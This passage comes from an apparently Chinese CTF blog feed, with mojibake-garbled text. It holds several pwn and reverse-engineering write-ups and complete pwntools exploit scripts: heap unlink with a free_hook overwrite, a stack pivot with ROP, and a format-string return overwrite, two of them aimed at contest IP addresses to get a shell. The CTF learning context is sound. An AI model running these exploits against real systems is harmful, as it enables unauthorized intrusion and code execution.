:io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;show\n&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;show\n&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;show\n&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))def show(idx):    sla(&#39;show\n&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))key2 = 0x6022B8for i in range(7):    add(i,0xf8,&#39;aaaaaaaa&#39;)add(7,0xf8,&quot;aaaa&quot;)#8payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)add(32,0xf8,payload)#32add(8,0x88,&quot;aaaa&quot;)add(9,0xf8,&quot;aaaa&quot;)add(10,0x88,&#39;aaaa&#39;)for i in range(7):    free(i+1) # ç”±äº32çš„å †å—ç”³è¯·åç ´åäº†0å·å †å—çš„åœ¨bssä¸Šåœ°å€çš„å‚¨å­˜payload = &#39;a&#39; * 0x80 + p64(0x180)edit(8,payload)free(9)payload = p64(0) * 3 + p64(0x00000000006021c8) + &#39;\x00&#39;  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)edit(32,payload)add(11,0x88,&#39; &#39;)show(11)r()libc_base = uu64(r(6)) - 0x3ebf20info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8rec = rce18[1] + libc_basepayload = p64(0) * 3 + p64(free_hook)edit(32,payload)edit(32,p64(rec))free(11)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTFæš‘å‡åˆ·é¢˜-1&quot;&gt;&lt;a href=&quot;#BUUCTFæš‘å‡åˆ·é¢˜-1&quot; class=&quot;headerlink&quot; title=&quot;BUUCTFæš‘å‡åˆ·é¢˜(1)&quot;&gt;&lt;/a&gt;BUUCTFæš‘å‡åˆ·é¢˜(1)&lt;/h1&gt;&lt;h2 id=&quot;cmcc-simplerop&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›-twice</title>
    <link href="http://chumen77.xyz/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/06/28/â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›/</id>
    <published>2020-06-28T12:43:20.845Z</published>
    <updated>2020-07-31T04:17:47.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›"><a href="#â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›" class="headerlink" title="â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›"></a>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›</h1><p>æ¯”èµ›æ—¶å½“å¤©æœ‰è€ƒè¯•ï¼Œå°±åšäº†ä¸ªç­¾é“é¢˜ã€‚</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="æŸ¥ä¿æŠ¤"><a href="#æŸ¥ä¿æŠ¤" class="headerlink" title="æŸ¥ä¿æŠ¤"></a>æŸ¥ä¿æŠ¤</h3><pre><code class="python">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><ul><li>ç¨‹åºå¯ä»¥ç»™ä½ 2æ¬¡çš„è¯»æ“ä½œï¼Œç¬¬ä¸€æ¬¡è¯»89å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡è¯»112å­—èŠ‚</li><li>æ ˆå¤§å°æ˜¯<code>0x60</code>ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚</li></ul><pre><code class="python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:    test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f (&quot;/media/psf/mypwn/no5space/pwn&quot;)0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre><ul><li>è°ƒè¯•å‘ç°ç¬¬ä¸€æ¬¡readï¼Œå¯ä»¥leak canary å’Œä¸€ä¸ªæ ˆåœ°å€ï¼Œä»è€Œå¯ä»¥æ ¹æ®åç§»ç®—å‡ºæ ˆä¸Šå…¶ä»–æœ‰ç”¨çš„åœ°å€ã€‚</li><li>ç¬¬äºŒæ¬¡ï¼Œéœ€è¦å¡«å……ä¸€ä¸‹canaryï¼Œç„¶åå¯ä»¥å»æ”»å‡»ret address</li></ul><p>ä½†æ˜¯ï¼Œå¹¶æ²¡æœ‰æ‹¿åˆ°libcçš„åœ°å€ï¼Œæ˜¯æ— æ³•æ‹¿åˆ°shellã€‚<strong>ç”±äºå¯ä»¥æº¢å‡ºçš„å­—èŠ‚æœ‰é™ï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œropã€‚</strong></p><h3 id="è·å–libcåœ°å€"><a href="#è·å–libcåœ°å€" class="headerlink" title="è·å–libcåœ°å€"></a>è·å–libcåœ°å€</h3><p>æ­¤æ—¶ï¼Œæ ¹æ®å‰é¢æ³„æ¼çš„æ ˆåœ°å€ï¼Œå¯ä»¥ç®—å‡ºreadå‡½æ•°çš„bufæ ˆåœ°å€ï¼Œç„¶å<strong>æ ˆè¿ç§»</strong>ä¸Šå»ï¼Œç„¶åè¿›è¡Œropæ¥leak å‡ºlibcåœ°å€ã€‚</p><p>æ‹¿åˆ°libcåœ°å€ä»¥åï¼Œropçš„ç»ˆç»“åœ°å€ä¸ºç¨‹åºçš„<code>start</code>ã€‚è®©å…¶æ¸…ç†æ ˆï¼Œå†æ¬¡è¿›è¡Œç¨‹åºçš„æ¼æ´åˆ©ç”¨ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;121.36.59.116&#39;,9999)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &quot;1&quot; * 0x57 + &#39;a&#39;sla(&quot;&gt;&quot;,payload)ru(&#39;a&#39;)canary = uu64(r(8)) - 0x0aprint(hex(canary))s_base = uu64(r(6)) - 0x70print(hex(s_base))  pop_rsi_pop_r15_ret = 0x0000000000400921pop_rbp_ret = 0x0000000000400690pop_rdi_ret = 0x0000000000400923leave_ret = 0x0000000000400879rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)# debug()sa(&quot;&gt;&quot;,payload)r(1)libc_base = uu64(r(6)) - libc.symbols[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&quot;&gt;&quot;,&#39;1&#39;)ru(&#39;1&#39;)rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[1]) + p64(libc_base+rce16[1])sla(&quot;&gt;&quot;,payload)itr()</code></pre><ul><li>æ³¨æ„åœ¨ç¬¬äºŒæ¬¡å‘é€payloadä¸è¦å‘å‡ºå»æ¢è¡Œç¬¦ã€‚</li><li>æœ€åä¸€æ¬¡payload ä¸­çš„ropä»€ä¹ˆçš„éƒ½æ˜¯æŠ„ç¬¬ä¸€æ¬¡çš„payloadï¼Œåªæ˜¯æŠŠæœ€åçš„ret address æ”¹æˆ one gadget ã€‚ï¼ˆåªæ˜¯å¡«å……å­—èŠ‚ç”¨çš„ï¼‰</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›&quot;&gt;&lt;a href=&quot;#â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›&quot; class=&quot;headerlink&quot; title=&quot;â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›&quot;&gt;&lt;/a&gt;â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›&lt;/h1&gt;&lt;p&gt;æ¯”èµ›æ—¶å½“å¤©æœ‰è€ƒè¯•ï¼Œå°±åšäº†ä¸ªç­¾é“é¢˜ã€‚&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(6th)</title>
    <link href="http://chumen77.xyz/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <id>http://chumen77.xyz/2020/06/27/DASCTFå®‰æ’æœˆèµ›(6th)/</id>
    <published>2020-06-27T14:27:37.170Z</published>
    <updated>2020-06-28T12:43:13.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-6th"><a href="#DASCTFå®‰æ’æœˆèµ›-6th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(6th)"></a>DASCTFå®‰æ’æœˆèµ›(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pycæ–‡ä»¶æ¢å¤"><a href="#pyCharm-pycæ–‡ä»¶æ¢å¤" class="headerlink" title="pyCharm(pycæ–‡ä»¶æ¢å¤)"></a>pyCharm(pycæ–‡ä»¶æ¢å¤)</h3><p>è¿™ä¸ªé¢˜åŸºæœ¬å‚è€ƒ<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>æ¥åšçš„ã€‚</p><h4 id="åŠ è½½pyc-co-code"><a href="#åŠ è½½pyc-co-code" class="headerlink" title="åŠ è½½pyc co_code"></a>åŠ è½½<code>pyc co_code</code></h4><pre><code>In [1]: import dis,marshalIn [2]: f=open(&#39;1.pyc&#39;)In [3]: f.read(4)Out[3]: &#39;\x03\xf3\r\n&#39;In [4]: f.read(4)Out[4]: &#39;jv\xe7^&#39;In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;, &#39;Are u ready?&#39;, 0, 32, &#39;a&#39;, &#39;&#39;, &#39;great!waht u input is the flag u wanna get.&#39;, &#39;pity!&#39;)In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:(&#39;base64&#39;, &#39;a&#39;, &#39;raw_input&#39;, &#39;flag&#39;, &#39;b64encode&#39;, &#39;c&#39;, &#39;list&#39;, &#39;d&#39;, &#39;range&#39;, &#39;i&#39;, &#39;join&#39;, &#39;ohh&#39;)In [9]: code.co_codeOut[9]: &quot;q\x03\x00q\x00\x06d\xffd\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00Z\x01\x00e\x02\x00d\x03\x00\x83\x01\x00Z\x03\x00e\x00\x00j\x04\x00e\x03\x00\x83\x01\x00Z\x05\x00e\x06\x00e\x05\x00\x83\x01\x00Z\x07\x00x&#39;\x00e\x08\x00d\x04\x00d\x05\x00\x83\x02\x00D]\x16\x00Z\t\x00e\x07\x00e\t\x00c\x02\x00\x19d\x06\x007\x03&lt;qI\x00Wd\x07\x00j\n\x00e\x07\x00\x83\x01\x00Z\x0b\x00e\x0b\x00e\x01\x00k\x02\x00r\x86\x00d\x08\x00GHn\x05\x00d\t\x00GHd\x01\x00S&quot;</code></pre><h4 id="ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘"><a href="#ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘" class="headerlink" title="ä½¿ç”¨disåº“å¯¹co_codeè¿›è¡Œåç¼–è¯‘:"></a>ä½¿ç”¨disåº“å¯¹<code>co_code</code>è¿›è¡Œåç¼–è¯‘:</h4><pre><code>In [10]: dis.dis(code.co_code)          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE         11 LOAD_CONST          1 (1)         14 IMPORT_NAME         0 (0)         17 STORE_NAME          0 (0)         20 LOAD_CONST          2 (2)         23 STORE_NAME          1 (1)         26 LOAD_NAME           2 (2)         29 LOAD_CONST          3 (3)         32 CALL_FUNCTION       1         35 STORE_NAME          3 (3)         38 LOAD_NAME           0 (0)         41 LOAD_ATTR           4 (4)         44 LOAD_NAME           3 (3)         47 CALL_FUNCTION       1         50 STORE_NAME          5 (5)         53 LOAD_NAME           6 (6)         56 LOAD_NAME           5 (5)         59 CALL_FUNCTION       1         62 STORE_NAME          7 (7)         65 SETUP_LOOP         39 (to 107)         68 LOAD_NAME           8 (8)         71 LOAD_CONST          4 (4)         74 LOAD_CONST          5 (5)         77 CALL_FUNCTION       2         80 GET_ITER         81 FOR_ITER           22 (to 106)         84 STORE_NAME          9 (9)         87 LOAD_NAME           7 (7)         90 LOAD_NAME           9 (9)         93 DUP_TOPX            2         96 BINARY_SUBSCR         97 LOAD_CONST          6 (6)        100 INPLACE_ADD        101 ROT_THREE        102 STORE_SUBSCR        103 JUMP_ABSOLUTE      73    &gt;&gt;  106 POP_BLOCK    &gt;&gt;  107 LOAD_CONST          7 (7)        110 LOAD_ATTR          10 (10)        113 LOAD_NAME           7 (7)        116 CALL_FUNCTION       1        119 STORE_NAME         11 (11)        122 LOAD_NAME          11 (11)        125 LOAD_NAME           1 (1)        128 COMPARE_OP          2 (==)        131 POP_JUMP_IF_FALSE   134    &gt;&gt;  134 LOAD_CONST          8 (8)        137 PRINT_ITEM        138 PRINT_NEWLINE        139 JUMP_FORWARD        5 (to 147)        142 LOAD_CONST          9 (9)        145 PRINT_ITEM        146 PRINT_NEWLINE    &gt;&gt;  147 LOAD_CONST          1 (1)        150 RETURN_VALUE</code></pre><p>è¿™é‡Œé¢éœ€è¦æ³¨æ„çš„å°±æ˜¯å¼€å¤´çš„ï¼š</p><pre><code>          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE</code></pre><p>æ˜æ˜¾åŠ å…¥äº†æ··æ·†ï¼Œæ€ä¹ˆçªç„¶å°±åœæ­¢äº†<code>STOP_CODE</code>ã€‚æ¥ç€å°±æ˜¯æƒ³åŠæ³•å»é™¤è¿™äº›æ··æ·†ï¼Œå’Œä¿®æ­£<code>co_code</code>é•¿åº¦ï¼ŒæœŸæœ›ä¿®æ”¹åçš„opcodeé¦–è¡Œä¸º</p><pre><code>0 LOAD_CONST 0(0)1 LOAD_CONST 1(1)</code></pre><p>å…¶ä¸­è¿™ç§äºŒè¿›åˆ¶å­—èŠ‚ç å¯¹åº”çš„ç¿»è¯‘ç»“æœï¼š</p><pre><code>0x64 æ“ä½œä¸ºLOAD_CONSTï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_CONST 1        HEX: 6401000x71 æ“ä½œä¸ºJUMP_ABSOLUTEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šJUMP_ABSOLUTE 14                HEX: 710e000x65 æ“ä½œä¸ºLOAD_NAMEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_NAME 1                HEX: 650100</code></pre><p>æ‰€ä»¥å¯»æ‰¾ï¼š</p><pre><code>0 LOAD_CONST 0(0)</code></pre><p>å³ä¸ºå¯»æ‰¾<code>HEX : 640000</code>è¿™ä¸ªä½œä¸ºæ··æ·†å­—æ®µç»“æŸã€‚<br>å¼€å¤´æ€ä¹ˆå¯»æ‰¾å‘¢ã€‚ç”±äºçœ‹å‰é¢3ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå«ä¹‰ï¼ŒçŒœæµ‹ï¼š</p><pre><code>0 JUMP_ABSOLUTE       3</code></pre><p>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>ï¿¼ï¿¼ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>é‚£å¾ˆæ˜æ˜¾æ··æ·†å­—æ®µå°±æ˜¯ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>ç„¶åç”¨å·¥å…·åˆ é™¤å³å¯ï¼Œå…¶ä¸­0x97å°±æ˜¯<code>co_code</code></p><pre><code>In [12]: len(code.co_code)Out[12]: 151In [13]: hex(151)Out[13]: &#39;0x97&#39;</code></pre><p>æ‰€ä»¥å»é™¤è¿™8ä¸ªå­—èŠ‚çš„æ··æ·†ä»£ç ï¼Œç„¶åä¿®æ”¹<code>co_code</code>é•¿åº¦ä¸º<code>0x8f</code>ã€‚</p><h4 id="è¿˜åŸåçš„pycå¼€å¤´"><a href="#è¿˜åŸåçš„pycå¼€å¤´" class="headerlink" title="è¿˜åŸåçš„pycå¼€å¤´"></a>è¿˜åŸåçš„pycå¼€å¤´</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h4><p>åç¼–è¯‘æ–¹æ³•å°±å¤šç§å¤šæ ·äº†ï¼Œå¯ä»¥åœ¨çº¿ä»€ä¹ˆçš„ï¼Œæˆ‘ä½¿ç”¨çš„<code>uncompyle6</code>.</p><pre><code>uncompyle6 -o 1.py 1.pyc</code></pre><pre><code># uncompyle6 version 3.7.1# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37)# [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc-# Embedded file name: pyCharm.py# Compiled at: 2020-06-15 21:23:54import base64a = &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;flag = raw_input(&#39;Are u ready?&#39;)c = base64.b64encode(flag)d = list(c)for i in range(0, 32):    d[i] += &#39;a&#39;ohh = (&#39;&#39;).join(d)if ohh == a:    print &#39;great!waht u input is the flag u wanna get.&#39;else:    print &#39;pity!&#39;%</code></pre><p>åç¼–è¯‘åè¿™é¢˜å°±ååˆ†ç®€å•äº†ã€‚</p><p>ç»™çš„å­—ç¬¦ä¸²æŠŠâ€œaâ€ï¼Œå»é™¤åè§£ç base64å³å¯ã€‚</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>ç›´æ¥å»hexä¸‹æå–è¿·å®«ï¼Œç”±äºæ˜¯100ä¸ªå­—ç¬¦ï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°æ˜¯10x10çš„è¿·å®«ã€‚<br>ç„¶åä¸¢vscodeã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>ç›´æ¥è·¯å¾„å°±å‡ºæ¥äº†ã€‚</p><pre><code>jkkjjhjjkjjkkkuukukkuuhhhuukkk</code></pre><p>Md5ä¸€ä¸‹å³å¯ã€‚</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>é¢˜ç›®ä¸éš¾ï¼Œå¤ªèœäº†ï¼Œçœ‹c++æœ‰ç‚¹å¤´å¤§ï¼Œåšçš„æœ‰ç‚¹æ…¢ã€‚IdaåŠ¨æ€è°ƒè¯•ï¼Œä¸€å…±3ä¸ªcheckï¼Œéƒ½æ˜¯æ–­åœ¨<code>Strcmp</code>ã€‚æ¯æ¬¡éšä¾¿è¾“å…¥ï¼Œç„¶ååˆ†æå’Œè·å–rdiï¼Œrsiå¯„å­˜å™¨å¯¹åº”åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚æ‹¿åˆ°ä»¥åï¼Œ3ä¸ªæ‹¼æ¥ä¸€ä¸‹å°±æ˜¯flagã€‚</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>è€ƒç‚¹å°±æ˜¯å †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼ŒæŒºç®€å•çš„ã€‚</p><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p> åˆ©ç”¨ç¯å¢ƒå˜é‡é‚£æ¡é“¾ï¼Œè¿›è¡Œæ”»å‡»<code>ret address</code>ï¼Œä¿®æ”¹ä¸ºone gadget<br>ç»™äº†8æ¬¡æ¼æ´åˆ©ç”¨æœºä¼šï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“å®ç°çš„ã€‚å…¶ä¸­<code>ret address</code>ï¼Œä¸º<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./springboard&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10029)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()sla(&quot;input&quot;,&quot;1&quot;)sla(&quot;input&quot;,&quot;2&quot;)sla(&quot;input&quot;,&quot;3&quot;)sla(&quot;input&quot;,&quot;%13$pAAAA%11$p&quot;)sleep(0.1)ru(&quot;0x&quot;)tag = int(r(12),16) - 0xe0ru(&quot;AAAA0x&quot;)libc_base = int(r(12),16) -0x21b97info_addr(&quot;libc_base&quot;,libc_base)key1 = hex(tag)[-4:]print(key1)payload = &#39;%{}c%13$hn&#39;.format(int(key1,16))sla(&quot;input&quot;,payload)sleep(5)rec = rce18[1] + libc_basekey2 = hex(rec)[-4:]print(key2)payload = &#39;%{}c%39$hn&#39;.format(int(key2,16))sla(&quot;input&quot;,payload)sleep(5)key3 = int(hex(tag)[-2:],16) + 2print(key3)payload = &#39;%{}c%13$hhn&#39;.format(key3)sla(&quot;input&quot;,payload)sleep(5)key4 = hex(rec)[-6:-4]print(key4)payload = &#39;%{}c%39$hhn&#39;.format(int(key4,16))sla(&quot;input&quot;,payload)itr()# 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)# 0008| 0x7fffffffe2f8 --&gt; 0x55554780# 0016| 0x7fffffffe300 --&gt; 0x555555756010 (&quot;11111111aaaaaaaa1111111122222222\n&quot;)# 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00# 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)# 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)# 0048| 0x7fffffffe320 --&gt; 0x1# 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (&quot;/media/psf/mypwn/ahys/6/springboard/springboard&quot;)# 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0# 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)# 0080| 0x7fffffffe340 --&gt; 0x0# 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42# 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)# 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1# 0112| 0x7fffffffe360 --&gt; 0x0# 0120| 0x7fffffffe368 --&gt; 0x0# 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42# 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42# 0144| 0x7fffffffe380 --&gt; 0x0# 0152| 0x7fffffffe388 --&gt; 0x0# 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</code></pre><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>è€ƒç‚¹å°±æ˜¯<code>IO_FILE</code>çš„ç›¸å…³çŸ¥è¯†äº†ï¼Œæ˜¯é’ˆå¯¹ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><p>è¿™ä¸ªé¢˜ä¼°è®¡æ˜¯å‚è€ƒ<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>è¿™ä¸ªé¢˜å‡ºçš„ï¼Œä½†æ˜¯æ–‡ä¸­çš„é¢˜æ¯”è¿™ä¸ªè¦éš¾å¤šäº†ã€‚ï¼ˆpsï¼šæ„Ÿè°¢å‡ºé¢˜äººæ‰‹ä¸‹ç•™æƒ…ï¼‰</p><h4 id="fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°"><a href="#fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°" class="headerlink" title="fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°"></a>fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable å‡½æ•° 